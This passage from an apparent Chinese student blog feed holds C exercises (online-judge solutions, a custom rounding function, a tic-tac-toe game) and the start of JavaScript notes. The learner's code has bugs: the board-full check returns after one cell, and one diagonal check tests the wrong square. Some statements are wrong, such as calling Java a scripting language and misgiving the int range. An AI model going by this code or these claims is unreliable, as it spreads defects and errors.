class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%ld %ld&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (istrue(x, y) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] = cacux(x, y); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自测运行"><a href="#自测运行" class="headerlink" title="自测运行"></a>自测运行</h3><p><img src="https://s2.loli.net/2023/03/12/Darzk5UVZu7MGf2.png" alt="3.png"></p><p>后面也找出问题了,数字太大越界了，尝试了long long还是不行,看了别人的解答发现根本看不懂。</p><p>😩</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学生基本信息输入输出引发的思考</title>
      <link href="/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="BC11-学生基本信息输入"><a href="#BC11-学生基本信息输入" class="headerlink" title="BC11 学生基本信息输入"></a>BC11 学生基本信息输入</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述:"></a>描述:</h2><p>依次输入一个学生的学号，以及3科（C语言，数学，英语）成绩，在屏幕上输出该学生的学号，3科成绩（注：输出成绩时需进行四舍五入且保留2位小数）。</p><h2 id="数据范围："><a href="#数据范围：" class="headerlink" title="数据范围："></a>数据范围：</h2><p>学号满足 1≤n≤20000000,各科成绩使用百分制，且不可能出现负数</p><h2 id="输入描述："><a href="#输入描述：" class="headerlink" title="输入描述："></a>输入描述：</h2><p>学号以及3科成绩，学号和成绩之间用英文分号隔开，成绩之间用英文逗号隔开。</p><h2 id="输出描述："><a href="#输出描述：" class="headerlink" title="输出描述："></a>输出描述：</h2><p>学号，3科成绩，输出格式详见输出样例。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>在开始读入数据时，刚想用int存储学号，想到int能够存取整数的范围，它存的下吗？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int size is %d byte.\n&quot;</span> , <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/ZcQwRAYFfjDimXl.png" alt="image.png"></p><p>实际上int的取值范围依赖于计算机系统,这里显示的4Byte，说明可以存取的数字范围是-2147483648～2147483647机2^32 ~ 2^32 - 1,所以用int类型就够了。</p><p>剩下的三个数用float即可，但题目又有要求要四舍五入，如果直接用%.2f的形式他会自动四舍五入吗，搜索资料后，答案有的说会，有的又说不会，我自己试了下是可以的，但有的人说不可以，虽然提交OJ是过了，但还是想写个四舍五入的方法，可以采用放大取余再看余数的范围。因为有三个数需要处理，所以我就写一个函数来解决问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//三位小数,我就直接先让它放大1000倍 </span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = b % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tmp &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>; </span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">80.635</span>;</span><br><span class="line"><span class="type">float</span> b = <span class="number">80.630</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(a));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(b));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/7POT96axM8cILXS.png" alt="image.png"></p><p>附上全代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span> &#123;</span><br><span class="line">    <span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        tmp = b % <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d;%f,%f,%f&quot;</span>, &amp;n, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The each subject score of No. %d is %.2f, %.2f, %.2f.&quot;</span>, n, test(a),</span><br><span class="line">           test(b), test(c));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/qKVIzAuPmN6Jntb.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三子棋</title>
      <link href="/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
      <url>/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//符号的定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROW 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数的声明</span></span><br><span class="line"><span class="comment">//初始化棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL],<span class="type">int</span> row,<span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.玩家赢了-*</span></span><br><span class="line"><span class="comment">//2.电脑赢了-#</span></span><br><span class="line"><span class="comment">//3.平局-Q</span></span><br><span class="line"><span class="comment">//4.游戏继续-C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否赢游戏</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否继续游戏</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br></pre></td></tr></table></figure><h1 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line">board[i][j] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %c &quot;</span>, board[i][j]);</span><br><span class="line"><span class="keyword">if</span> (j &lt; col - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (i &lt; row - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(j &lt; col<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入下棋的坐标:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"><span class="comment">//判断坐标合法性</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt;= row &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; y &lt;= col)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//下棋</span></span><br><span class="line"><span class="comment">//判断坐标是否被占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x - <span class="number">1</span>][y - <span class="number">1</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x - <span class="number">1</span>][y - <span class="number">1</span>] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标被占用,请重新输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标非法，请重新从输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = rand() % row;</span><br><span class="line"><span class="type">int</span> y = rand() % col;</span><br><span class="line"><span class="comment">//判断占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x][y] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x][y] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断三行</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][<span class="number">0</span>] == board[i][<span class="number">1</span>] &amp;&amp; board[i][<span class="number">1</span>] == board[i][<span class="number">2</span>] &amp;&amp; board[i][<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断三列</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; col; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][i] == board[<span class="number">1</span>][i] &amp;&amp; board[<span class="number">1</span>][i] == board[<span class="number">2</span>][i] &amp;&amp; board[<span class="number">1</span>][i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断对角</span></span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">0</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">2</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断平局</span></span><br><span class="line"><span class="comment">//如果满返回1.不满返回0</span></span><br><span class="line"><span class="type">int</span> ret = IsFull(board,row,col);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继续</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="界面实现"><a href="#界面实现" class="headerlink" title="界面实现"></a>界面实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     1.play     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     0.exit     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//存储数据-二维数组（棋盘）</span></span><br><span class="line"><span class="type">char</span> board[ROW][COL];</span><br><span class="line"><span class="comment">//初始化棋盘-初始化空格</span></span><br><span class="line">InitBoard(board, ROW, COL);</span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line">DisplayBoard(board,ROW,COL);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line">PlayerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard( board, ROW, COL);</span><br><span class="line">ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line">ComputerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢了\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">switch</span> (input)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">game();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;三子棋游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;退出游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;选择错误，重新选择\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (input);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记</title>
      <link href="/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript概述"><a href="#JavaScript概述" class="headerlink" title="JavaScript概述"></a>JavaScript概述</h1><ol><li>简称js</li><li>一种脚本语言，脚本语言的特点<br> java语言是一种脚本语言<br> JavaScript的目标程序是以普通文本的形式保存，用记事本可以直接打开的</li><li>JavaScript和JScript的关系</li><li>JavaScript主要用来操作HTML中的节点，产生动态效果</li><li>JavaScript和Java的区别<br> JavaScript运行在浏览器中，浏览器中有JS代码的内核<br> Java运行在JVM中，JavaScript和JAVA没有任何关系<br> Java语言是SUN公司开发的，JavaScript这个名字是SUN公司给起的名<br> JavaScript是一门编程语言，专门用来操作HTML页面中的节点，让王爷产生动态效果的，JavaScript中也有变量，数据类型等</li></ol><h1 id="JavaScript-包括三块：ECMAScript、DOM、BOM"><a href="#JavaScript-包括三块：ECMAScript、DOM、BOM" class="headerlink" title="JavaScript 包括三块：ECMAScript、DOM、BOM"></a>JavaScript 包括三块：ECMAScript、DOM、BOM</h1><ol><li>ECMAScript是ECMA制定的262标准，JavaScript和Jscript都遵守这个标准，ECMAScript是JavaScript核心语法</li><li>DOM编程时通过JavaScript对HTML中的dom节点进行操作，DOM时有规范的，DOM规范时W3C制定的。</li><li>BOM编程是对浏览器本身操作，例如：前进、后退、地址栏、关闭窗口、弹窗等。由于浏览器由不同的厂家制造，所以BOM缺少规范，一般只是有一个默认的行业规范。（Brower Object Model，浏览器对象类型）</li></ol><h1 id="JavaScript-嵌入JS三种方式以及JS的注释"><a href="#JavaScript-嵌入JS三种方式以及JS的注释" class="headerlink" title="JavaScript 嵌入JS三种方式以及JS的注释"></a>JavaScript 嵌入JS三种方式以及JS的注释</h1><h2 id="3-1-行间事件"><a href="#3-1-行间事件" class="headerlink" title="3.1 行间事件"></a>3.1 行间事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第一种方式：行间事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、需求：用户点击以下这个按钮，弹出一个对话框，对话框上显示：hello world</span></span><br><span class="line"><span class="comment">2、JavaScript是一种事件驱动型的编程语言，通常都是在发生某个事件的时候，去执行</span></span><br><span class="line"><span class="comment">某段代码。其中事件包括很多，例如：鼠标单击事件click，另外还有其它事件，例如：</span></span><br><span class="line"><span class="comment">mouseover是鼠标经过事件等。并且在JavaScript当中任何一个事件都有对应的事件句柄。</span></span><br><span class="line"><span 